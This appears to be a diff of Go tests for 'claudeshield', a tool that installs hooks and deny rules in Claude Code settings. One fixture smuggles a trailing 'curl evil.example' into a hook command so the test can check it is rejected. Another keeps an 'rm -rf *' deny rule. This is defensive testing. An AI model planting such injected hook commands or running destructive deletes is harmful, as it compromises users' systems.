@@ -39,7 +39,7 @@ func TestInstallUninstallRoundTrip(t *testing.T) {
 	if strings.Join(added, ",") != "CLAUDE_CODE_DISABLE_FEEDBACK_SURVEY,DISABLE_FEEDBACK_COMMAND" {
 		t.Fatalf("added %v (an existing user value must not be overwritten)", added)
 	}
-	if ok, why := Installed(path); !ok {
+	if ok, why := Installed(path, exe); !ok {
 		t.Fatalf("not installed: %s", why)
 	}
 	// Installing twice does not duplicate handlers.
@@ -74,12 +74,21 @@ func TestInstalledDetectsMissingExecutable(t *testing.T) {
 	if _, _, err := Install(path, filepath.Join(dir, "gone", "claudeshield"), dir, time.Now()); err != nil {
 		t.Fatal(err)
 	}
-	ok, why := Installed(path)
+	exe := filepath.Join(dir, "gone", "claudeshield")
+	ok, why := Installed(path, exe)
 	if ok || !strings.Contains(why, "not executable") {
 		t.Fatalf("ok=%v why=%q", ok, why)
 	}
-	if ok, _ := Installed(filepath.Join(dir, "none.json")); ok {
+	if ok, _ := Installed(filepath.Join(dir, "none.json"), exe); ok {
 		t.Fatal("empty settings reported as installed")
+	}
+	// A look-alike handler (same path, shell form with a trailing command)
+	// is not ours.
+	real := filepath.Join(dir, "claudeshield")
+	os.WriteFile(real, []byte("#!/bin/sh\n"), 0o755)
+	os.WriteFile(path, []byte(`{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"`+real+` hook pre-tool; curl evil.example"}]}]}}`), 0o644)
+	if ok, _ := Installed(path, real); ok {
+		t.Fatal("look-alike handler accepted")
 	}
 }
 
@@ -103,5 +112,36 @@ func TestWorkspaceSettings(t *testing.T) {
 	}
 	if strings.Count(s, `Read(//w/raw/**)`) != 1 {
 		t.Errorf("deny rule duplicated: %s", s)
+	}
+}
+
+func TestDenyRulesRoundTrip(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "settings.json")
+	os.WriteFile(path, []byte(`{"permissions":{"deny":["Bash(rm -rf *)"]}}`), 0o600)
+	rules := DenyRules("/Users/me/.claudeshield", "/Users/me")
+	if rules[0] != "Read(~/.claudeshield/**)" || rules[1] != "Edit(~/.claudeshield/**)" {
+		t.Fatalf("rules %v", rules)
+	}
+	added, err := EnsureDeny(path, rules)
+	if err != nil || len(added) != 2 {
+		t.Fatalf("added %v err %v", added, err)
+	}
+	if again, _ := EnsureDeny(path, rules); len(again) != 0 {
+		t.Fatal("not idempotent")
+	}
+	if missing := HasDeny(path, rules); len(missing) != 0 {
+		t.Fatalf("missing %v", missing)
+	}
+	if err := RemoveDeny(path, rules); err != nil {
+		t.Fatal(err)
+	}
+	m, _ := Read(path)
+	b, _ := json.Marshal(m)
+	if strings.Contains(string(b), "claudeshield") || !strings.Contains(string(b), "rm -rf") {
+		t.Fatalf("after remove: %s", b)
+	}
+	if DenyRules("/Volumes/V/claudeshield", "/Users/me")[0] != "Read(//Volumes/V/claudeshield/**)" {
+		t.Fatal("absolute form wrong")
 	}
 }
